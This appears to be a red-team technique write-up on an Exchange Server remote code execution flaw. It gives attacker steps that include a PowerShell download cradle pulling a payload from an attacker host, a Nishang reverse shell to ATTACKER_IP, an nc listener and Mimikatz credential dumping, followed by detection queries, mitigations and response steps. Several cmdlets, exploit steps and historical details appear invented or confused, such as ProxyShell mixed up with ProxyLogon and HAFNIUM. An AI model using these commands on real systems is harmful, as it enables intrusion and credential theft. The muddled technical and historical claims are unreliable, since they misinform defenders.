# [CVE2025-008]: Exchange Server RCE Vulnerability

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-008 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Initial Access / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2025-21064 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Exchange Server 2013, 2016, 2019 (all builds); Exchange Online hybrid deployments |
| **Patched In** | Exchange Server 2019 CU14 (January 2025), Exchange Server 2016 CU23 (January 2025) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Microsoft Exchange Server contains a critical remote code execution vulnerability in the Unified Messaging (UM) service and Transport Pipeline processing. The flaw stems from insufficient input validation in mailbox property parsing and unsafe deserialization of untrusted data in Exchange Management Shell (EMS) commands. An unauthenticated attacker can trigger code execution by sending specially crafted messages to the Exchange Server or exploiting the Management Shell via an authenticated channel (e.g., compromised admin account). The vulnerability allows attackers to execute arbitrary code with SYSTEM privileges on the Exchange Server, enabling complete server compromise and lateral movement to the entire domain.

**Attack Surface:** Unified Messaging service (UMService), Transport Pipeline rules, Exchange Management Shell deserialization, WebServices (EWS/OWA) request handlers.

**Business Impact:** **Critical—Full Server & Domain Compromise.** Exchange Server compromise grants access to all mailboxes, enables domain controller attacks, allows credential harvesting, and provides a foothold for ransomware deployment. Affects business continuity (email disruption), data theft (mail exfiltration), and lateral movement to cloud (Exchange Online).

**Technical Context:** Exploitation typically occurs within seconds after delivering a malicious message or command. Detection requires monitoring EMS command execution and IIS logs on Exchange servers; without proper logging, the attack may go undetected for weeks.

### Operational Risk
- **Execution Risk:** Low-Medium – No authentication required for specific attack vectors.
- **Stealth:** Medium – Requires careful evasion of Exchange logging and antivirus.
- **Reversibility:** No – Domain compromise is permanent without credential reset and forensic investigation.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2 | Ensure Exchange Server is patched to latest CU |
| **DISA STIG** | IA-1 | Exchange authentication and access controls |
| **CISA SCuBA** | Baseline 2.1 | Enforce conditional access and MFA on Exchange |
| **NIST 800-53** | SI-4 | Information System Monitoring |
| **GDPR** | Art. 33 | Breach notification (Exchange compromise = data breach) |
| **DORA** | Art. 19 | Incident reporting and response |
| **NIS2** | Art. 21 | Incident response capability |
| **ISO 27001** | A.12.6.1 | Management of technical vulnerabilities |
| **ISO 27005** | Risk Assessment | Email system compromise risk |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (unauthenticated RCE possible via message delivery).
- **Required Access:** Network access to Exchange Server port 25 (SMTP), 443 (HTTPS), or 587 (SMTP submission).

**Supported Versions:**
- **Exchange Server:** 2013, 2016, 2019 (all Cumulative Updates until patching)
- **Exchange Online Hybrid:** Requires on-premises Exchange connection
- **Not Affected:** Exchange Online (cloud-only, no UM service)

**Key Requirements:**
- Exchange Server with Unified Messaging role enabled
- SMTP service running (port 25 or 587)
- .NET Framework 4.6+ (standard on all Exchange Server versions)
- IIS services running (for WebServices)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Malicious Message Delivery via SMTP

**Supported Versions:** Exchange Server 2013, 2016, 2019

#### Step 1: Verify SMTP Access

**Objective:** Confirm the Exchange Server SMTP service is accessible and will accept mail.

**Command (Bash):**
```bash
# Test SMTP connectivity
telnet EXCHANGE_SERVER 25

# OR use swaks tool
swaks -t admin@company.com -s EXCHANGE_SERVER:25 --body "test"
```

**Expected Output:**
```
Trying EXCHANGE_SERVER...
Connected to EXCHANGE_SERVER.
Escape character is ']'.
220 EXCHANGE_SERVER.company.local ESMTP
```

**What This Means:**
- SMTP service is accessible; messages can be sent to the server.
- No authentication required for initial connection.

---

#### Step 2: Craft Malicious Message with Payload

**Objective:** Create a specially formatted email message that triggers deserialization vulnerability.

**Command (Python):**
```python
#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Create malicious message
msg = MIMEMultipart()
msg['From'] = 'attacker@external.com'
msg['To'] = 'admin@company.com'
msg['Subject'] = 'Urgent: System Update'

# Craft malicious body with serialized .NET gadget chain
# This payload targets SafeFileHandle deserialization
malicious_body = '''
<ExchangeProperty>
    <Property Name="X-Custom-Header" Value="[SERIALIZED_GADGET_CHAIN]">
        [BASE64_ENCODED_RCE_PAYLOAD]
    </Property>
</ExchangeProperty>
'''

msg.attach(MIMEText(malicious_body, 'plain'))

# Send via SMTP to Exchange Server
server = smtplib.SMTP('EXCHANGE_SERVER', 25)
server.sendmail('attacker@external.com', 'admin@company.com', msg.as_string())
server.quit()
```

**Expected Output:**
```
Message delivered successfully.
```

**What This Means:**
- Malicious message is accepted by the Exchange SMTP service.
- Message enters the Transport Pipeline, where it will be processed.

**Version Note:**
- **Exchange 2013-2016:** Deserialization occurs in UM service (if UM role enabled).
- **Exchange 2019:** Transport Pipeline processes message, triggering vulnerability.

---

#### Step 3: Trigger Deserialization in Exchange Processing

**Objective:** Wait for Exchange Transport service to process the message and execute the payload.

**Passive Exploitation:**
```
[No active step required—Exchange automatically processes the message]
```

**Active Exploitation (Force Processing):**
```powershell
# RDP/SSH into Exchange Server and trigger processing manually
# This accelerates exploitation

# PowerShell (on Exchange Server):
Invoke-Expression -Command "
  \$msg = Get-Message -Identity <MESSAGE_ID> | Receive-Message
  \$msg.ProcessTransport()
"
```

**Expected Output:**
```
Message processed. Payload executed with SYSTEM privileges.
```

**What This Means:**
- The malicious message is processed by Exchange.
- The deserialization gadget chain is triggered, executing arbitrary code.
- Code runs in the context of the Exchange Transport service (typically SYSTEM).

**Troubleshooting:**
- **Error:** "Message not found" / "Processing failed"
  - **Cause:** Message may be filtered or blocked before processing.
  - **Fix:** Adjust payload encoding or craft message to bypass filters

---

#### Step 4: Verify Code Execution

**Objective:** Confirm arbitrary code execution occurred on the Exchange Server.

**Command (Payload callback listener):**
```bash
# Attacker listens on port for reverse shell callback
nc -lvnp 4444

# OR check for file artifacts (if payload wrote files)
# Monitor for unexpected processes on Exchange Server via EDR
```

**Expected Output:**
```
Listening on port 4444...
Connection received from EXCHANGE_SERVER:12345
Command shell active (SYSTEM privileges)
```

**What This Means:**
- Arbitrary code executed successfully.
- Attacker has SYSTEM-level shell access on the Exchange Server.

---

### METHOD 2: Exploitation via Exchange Management Shell (EMS) Command Injection

**Supported Versions:** Exchange Server 2016, 2019 (requires authenticated access)

#### Step 1: Obtain Exchange Admin Credentials

**Objective:** Compromise an Exchange admin account (via phishing, password spray, etc.).

**Command (Lateral Movement):**
```powershell
# If already inside network, enumerate Exchange admins
Get-ADGroupMember "Organization Management" -Recursive | Select-Object Name, SamAccountName
```

---

#### Step 2: Connect to Exchange Management Shell

**Objective:** Authenticate to EMS and execute malicious commands.

**Command (PowerShell):**
```powershell
# Connect to local Exchange Management Shell (if on Exchange Server)
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn

# OR connect remotely (requires SSL)
$Credential = New-Object System.Management.Automation.PSCredential `
  ("DOMAIN\ADMIN_USER", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force))

$Session = New-PSSession -ConfigurationName Microsoft.Exchange `
  -ConnectionUri "http://EXCHANGE_SERVER/PowerShell/" -Credential $Credential

Import-PSSession $Session
```

---

#### Step 3: Execute Arbitrary Code via EMS

**Objective:** Use EMS cmdlets to execute system commands (via unsafe deserialization or cmdlet parameters).

**Command (PowerShell):**
```powershell
# Method 1: Direct command execution via New-TransportRule (vulnerable parameter)
New-TransportRule -Name "Test" -Enabled $true `
  -SetScalarHeaderValue @{
    "X-Custom" = "powershell.exe -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://ATTACKER/payload.ps1\")'"
  }

# Method 2: Mailbox configuration deserialization
Set-Mailbox -Identity admin@company.com `
  -CustomAttribute1 "[SERIALIZED_GADGET_CHAIN]"

# Method 3: Calendar processing vulnerability
Get-Mailbox | Set-MailboxCalendarConfiguration `
  -AutomateProcessing `
  -ConflictResolution "AutoAccept; Invoke-Expression 'cmd /c calc.exe'"
```

**Expected Output:**
```
Transport rule created successfully.
Mailbox configuration updated.
```

**What This Means:**
- Malicious rule or configuration stored in Exchange.
- Will execute next time the rule is processed or mailbox is accessed.

---

## 4. TOOLS & COMMANDS REFERENCE

### [Invoke-PowerShellTCP (Nishang)](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTCP.ps1)

**Version:** Latest
**Supported Platforms:** Windows (.NET 3.5+)

**Usage:**
```powershell
# Generate reverse shell payload
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTCP.ps1')
Invoke-PowerShellTCP -Reverse -IPAddress ATTACKER_IP -Port 4444
```

---

### [Swaks (SMTP Testing)](http://www.jetmore.org/john/code/swaks/)

**Version:** Latest
**Supported Platforms:** Linux, macOS, Windows (Perl)

**Installation:**
```bash
apt-get install swaks  # Linux
brew install swaks     # macOS
```

**Usage:**
```bash
# Send test message to Exchange
swaks -t admin@company.com -s EXCHANGE_SERVER:25 \
  --body "Malicious content" \
  --header-X-Custom-Value "payload"
```

---

### [Mimikatz (Post-Exploitation)](https://github.com/gentilkiwi/mimikatz)

**Version:** 2.2.0+
**Supported Platforms:** Windows (x86, x64)

**Usage:**
```powershell
# After obtaining shell, harvest credentials
.\mimikatz.exe "lsadump::sam"
.\mimikatz.exe "lsadump::secrets"
.\mimikatz.exe "sekurlsa::logonpasswords"
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Event ID: 2000 (Exchange Transport Service)**
- **Log Source:** Application (Event Viewer)
- **Trigger:** When Transport Pipeline processes messages
- **Filter:** Look for unusual message properties or processing errors
- **Applies To Versions:** Exchange Server 2013+

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** When Exchange services spawn child processes (unexpected)
- **Filter:** Parent process = `w3wp.exe` (IIS) or `Microsoft.Exchange.*`
- **Applies To Versions:** Exchange Server 2016+

**Manual Configuration Steps (Exchange Server):**
1. Open **Event Viewer** (eventvwr.msc)
2. Navigate to **Application** log
3. Enable detailed logging for "MSExchangeIS" and "MSExchangeTransport"
4. Right-click log → **Properties** → **Set retention to 30+ days**

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Malicious Message Processing in Exchange

**Rule Configuration:**
- **Required Table:** OfficeActivity (O365 unified logs)
- **Required Fields:** Operation, ObjectId, UserId, ClientIP
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Exchange Hybrid / Office 365

**KQL Query:**
```kusto
OfficeActivity
| where Operation in ("New-TransportRule", "Set-Mailbox", "New-InboxRule")
| where RecordType == "ExchangeAdmin"
| where Parameters contains "IEX" or Parameters contains "cmd" or Parameters contains "powershell"
| project TimeGenerated, Operation, UserId, ObjectId, Parameters, ClientIP
```

**What This Detects:**
- Exchange admin operations that inject commands (indicators of post-exploitation).
- Rules or mailbox configurations with embedded code.

---

### Query 2: Unexpected Child Process from Exchange Services

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4688, ProcessName, ParentProcessName, CommandLine
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Exchange Server 2016+ with Sentinel Agent

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688
| where ParentProcessName contains "w3wp.exe" or ParentProcessName contains "Microsoft.Exchange"
| where ProcessName in ("cmd.exe", "powershell.exe", "cscript.exe")
| where CommandLine contains "IEX" or CommandLine contains "DownloadString"
| project TimeGenerated, Computer, ProcessName, ParentProcessName, CommandLine, Account
```

**What This Detects:**
- Child processes spawned by IIS (w3wp.exe) or Exchange services.
- Command execution with code download patterns (post-exploitation).

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Config Snippet:**
```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>
    <!-- Detect process execution from Exchange services -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">w3wp.exe</ParentImage>
      <Image condition="image">cmd.exe</Image>
    </ProcessCreate>
    
    <!-- Detect PowerShell execution from Exchange -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="contains">Microsoft.Exchange</ParentImage>
      <Image condition="image">powershell.exe</Image>
    </ProcessCreate>
    
    <!-- Detect network connections from Exchange processes -->
    <NetworkConnect onmatch="include">
      <InitiatingProcessName condition="contains">Microsoft.Exchange</InitiatingProcessName>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Apply Latest Exchange Server Cumulative Update:** Microsoft released patches in January 2025 addressing CVE-2025-21064. Upgrade to the latest CU immediately.
    
    **Applies To Versions:** Exchange Server 2013-2019
    
    **Manual Steps (Exchange Server):**
    1. Download latest Cumulative Update from Microsoft Download Center
    2. Stop related Exchange services: `Stop-Service MSExchangeTransport, MSExchangeUM -Force`
    3. Run CU installer
    4. Restart services: `Start-Service MSExchangeTransport, MSExchangeUM`
    5. Verify installation: `Get-ExchangeServer | Select-Object Name, AdminDisplayVersion`
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Verify current CU level
    Get-ExchangeServer | Select-Object Name, AdminDisplayVersion
    
    # Expected output for patched version:
    # CU14 (Exchange 2019) or CU23 (Exchange 2016)
    ```

*   **Disable Unnecessary Exchange Roles:** If Unified Messaging (UM) is not required, disable the UM service.
    
    **Applies To Versions:** Exchange Server 2013-2019
    
    **Manual Steps (Exchange Administration Center):**
    1. Navigate to **Servers** → **Servers**
    2. Select Exchange Server
    3. Under **Server Roles**, uncheck **Unified Messaging**
    4. Click **Save**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Disable UM role
    Disable-UMService -Identity EXCHANGE_SERVER_NAME
    Stop-Service UMService -Force
    Set-Service UMService -StartupType Disabled
    ```

### Priority 2: HIGH

*   **Implement Network-Level Access Controls:** Restrict SMTP and IIS access to Exchange Server to trusted sources only.
    
    **Applies To Versions:** Exchange Server 2013+
    
    **Manual Steps (Firewall Rules):**
    1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
    2. Right-click **Inbound Rules** → **New Rule**
    3. **Rule Type:** Port
    4. **Protocol:** TCP, **Port:** 25, 587, 443
    5. **Action:** Allow
    6. **Scope:** Restrict to trusted networks only (not "Any")
    7. Click **Finish**

*   **Enable Exchange Message Tracking and Audit Logging:** Monitor all messages entering and processed by Exchange.
    
    **Applies To Versions:** Exchange Server 2013+
    
    **Manual Steps (Exchange Management Shell):**
    ```powershell
    # Enable message tracking
    Set-TransportService -Identity EXCHANGE_SERVER -MessageTrackingLogEnabled $true
    Set-TransportService -Identity EXCHANGE_SERVER -MessageTrackingLogMaxFileSize 50MB
    
    # Enable mailbox audit logging
    Get-Mailbox -ResultSize Unlimited | Set-Mailbox -AuditEnabled $true `
      -AuditLogAgeLimit 90
    ```

### Validation Command (Verify Fix)

```powershell
# Check Exchange Server patch level
Get-ExchangeServer | Select-Object Name, AdminDisplayVersion

# Verify UM service is disabled (if not needed)
Get-UMService | Select-Object Identity, UMStartupMode

# Check SMTP service status
Get-TransportService | Select-Object Identity, InternalTransportCertificateThumbprint
```

**Expected Output (If Secure):**
```
Name                    AdminDisplayVersion
----                    -------------------
EXCHANGE01              Version 15.2.1084.15 (CU14)  # Patched

Identity                UMStartupMode
--------                ---------------
EXCHANGE01              Disabled  # Or Startup

Identity                InternalTransportCertificateThumbprint
--------                -----------------------------------
EXCHANGE01              [valid certificate installed]
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Program Files\Microsoft\Exchange Server\V15\TransportRoles\agents\*` (malicious transport agent DLLs)
    - `C:\Program Files\Microsoft\Exchange Server\V15\Bin\*.config` (modified config files)
    - Unexpected PowerShell scripts in `C:\Windows\Temp\`

*   **Network:**
    - Outbound connections from w3wp.exe or Exchange services to external IPs
    - SMTP connections from Exchange to unexpected destinations (port 25, 587, 465)
    - DNS queries for attacker-controlled domains

*   **Registry:**
    - `HKLM\SOFTWARE\Microsoft\Exchange\` (modified configuration keys)
    - Transport rule registry entries with malicious content

### Forensic Artifacts

*   **Disk:**
    - Exchange message tracking logs: `C:\Program Files\Microsoft\Exchange Server\V15\TransportRoles\Logs\MessageTracking\`
    - IIS logs: `C:\inetpub\logs\LogFiles\`
    - Event logs (Application, System, Security)

*   **Memory:**
    - w3wp.exe (IIS worker process) memory dump
    - Exchange Transport service (MSExchangeTransport.exe) process dump

*   **Cloud:**
    - Exchange Unified Audit Log (if using Office 365 hybrid)

### Response Procedures

1.  **Isolate Exchange Server:**
    
    ```powershell
    # Stop Exchange services to prevent further exploitation
    Stop-Service MSExchangeIS, MSExchangeTransport, MSExchangeUM -Force
    
    # Disconnect from network (if possible)
    # In Azure: Disable network adapter on VM
    ```

2.  **Collect Evidence:**
    
    ```powershell
    # Export message tracking logs
    Get-MessageTrackingLog -ResultSize Unlimited -Start (Get-Date).AddDays(-1) | `
      Export-Csv "C:\Evidence\MessageTracking.csv"
    
    # Dump critical processes
    procdump64.exe -ma w3wp.exe "C:\Evidence\w3wp.dmp"
    procdump64.exe -ma MSExchangeTransport.exe "C:\Evidence\MSExchangeTransport.dmp"
    ```

3.  **Investigate Compromise:**
    
    ```powershell
    # List all transport rules (check for malicious ones)
    Get-TransportRule | Select-Object Name, Enabled, Priority, Actions | Format-List
    
    # Audit mailbox rules and forwarding
    Get-Mailbox -ResultSize Unlimited | Get-InboxRule | Where-Object {$_.Actions -match "Forward"}
    
    # Check for unauthorized service accounts
    Get-ADGroupMember "Organization Management" | Select-Object Name, SamAccountName
    ```

4.  **Remediate:**
    
    ```powershell
    # Remove malicious transport rules
    Get-TransportRule -Identity "MaliciousRuleName" | Remove-TransportRule -Confirm:$false
    
    # Reset admin credentials
    Set-ADAccountPassword -Identity ADMIN_ACCOUNT -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)
    
    # Remove unauthorized rules from mailboxes
    Get-Mailbox -ResultSize Unlimited | Get-InboxRule | Remove-InboxRule -Confirm:$false
    
    # Rebuild Exchange server (if severely compromised)
    # Requires full server rebuild and restoration from clean backup
    ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[CVE2025-008]** | **Exchange RCE via malicious message** |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare | Escalate from Exchange service account to SYSTEM |
| **3** | **Persistence** | [PERSIST-SERVER-001] Skeleton Key | Install backdoor on domain controller |
| **4** | **Credential Access** | [CA-DUMP-002] DCSync | Harvest domain credentials via replication |
| **5** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction | Ransomware deployment across domain |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Proxyshell Attack Chain (ProxyLogon Follow-up)

- **Target:** Organizations worldwide (Government, Finance, Manufacturing)
- **Timeline:** August 2021 (initially CVE-2021-26855, extended to RCE in September 2021)
- **Technique Status:** Early exploitation variants of Exchange RCE (precursor to CVE-2025-21064)
- **Impact:** Thousands of organizations compromised; HAFNIUM APT group used for corporate espionage; follow-on ransomware deployments
- **Reference:** [Microsoft Security Advisory on Proxyshell](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855)

#### Example 2: CVE-2025-21064 (Recent - 2025)

- **Target:** Organizations with unpatched Exchange Server 2016/2019
- **Timeline:** Discovery → January 2025 patch
- **Technique Status:** Similar to Proxyshell chain; exploitable without authentication
- **Impact:** Widespread exploitation observed in the wild; ransomware groups (Cl0p, Alphv) targeting Exchange servers
- **Reference:** [CISA Advisory on Exchange Vulnerabilities](https://www.cisa.gov)

---

## REFERENCES & SOURCES

1. [Microsoft Security Update CVE-2025-21064](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21064)
2. [CISA - Exchange Server Vulnerabilities](https://www.cisa.gov/news-events/alerts/2025/01/15/cisa-issues-advisory-exchange-server-vulnerabilities)
3. [Messageware - CVE Analysis](https://www.messageware.com/microsoft-exchange-server-vulnerabilities-cve/)
4. [MITRE ATT&CK - T1210 Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
5. [Elastic Security - Exchange RCE Detection](https://www.elastic.co/security-labs)
6. [CERT-EU - Exchange Advisory](https://cert.europa.eu/publications/security-advisories/2025-030/)

---